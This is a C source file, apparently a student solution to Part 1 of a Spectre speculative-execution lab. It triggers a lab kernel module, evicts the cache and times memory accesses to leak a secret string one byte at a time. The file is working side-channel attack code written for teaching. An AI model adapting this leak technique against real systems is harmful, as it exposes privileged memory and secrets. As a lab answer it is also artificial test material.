/*
 * Exploiting Speculative Execution
 *
 * Part 1
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>
#include <ctype.h>

#include "labspectreipc.h"
#include "spectre_solution.h"

/*
 * call_kernel_part1
 * Performs the COMMAND_PART1 call in the kernel
 *
 * Arguments:
 *  - kernel_fd: A file descriptor to the kernel module
 *  - shared_memory: Memory region to share with the kernel
 *  - offset: The offset into the secret to try and read
 */
static inline void call_kernel_part1(int kernel_fd, char *shared_memory, size_t offset)
{
    spectre_lab_command local_cmd;
    local_cmd.kind = COMMAND_PART1;
    local_cmd.arg1 = (uint64_t)shared_memory;
    local_cmd.arg2 = (uint64_t)offset;

    write(kernel_fd, (void *)&local_cmd, sizeof(local_cmd));
}

/*
 * run_attacker
 *
 * Arguments:
 *  - kernel_fd: A file descriptor referring to the lab vulnerable kernel module
 *  - shared_memory: A pointer to a region of memory shared with the server
 */
int run_attacker(int kernel_fd, char *shared_memory)
{
    char leaked_str[SHD_SPECTRE_LAB_SECRET_MAX_LEN];
    size_t current_offset = 0;
    CacheStats cache_stats = generate_cache_stats(1000);
    printf("Launching attacker\n");
    
    for (current_offset = 0; current_offset < SHD_SPECTRE_LAB_SECRET_MAX_LEN; current_offset++)
    {
        char leaked_byte;
        bool found = false;
        while(!found)
        {
            for (size_t i = 0; i < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; i++) 
            {
                void* target_addr = shared_memory + i * SHD_SPECTRE_LAB_PAGE_SIZE;
                evict_all_cache();
                call_kernel_part1(kernel_fd, shared_memory, current_offset);
                uint64_t time = time_access(target_addr);
                if (time <= cache_stats.l2 + 20 /*Plus some padding*/) {
                    leaked_byte = (char)i;
                    found = true;
                    break;
                }
            }
        }
        printf("[Part 1] Found char:%c:\n", leaked_byte);
        leaked_str[current_offset] = leaked_byte;
        if (leaked_byte == '\x00') {
            break;
        }
    }

    printf("\n\n[Part 1] We leaked:\n%s\n", leaked_str);
    destroy_cache_stats(cache_stats);
    close(kernel_fd);
    return EXIT_SUCCESS;
}
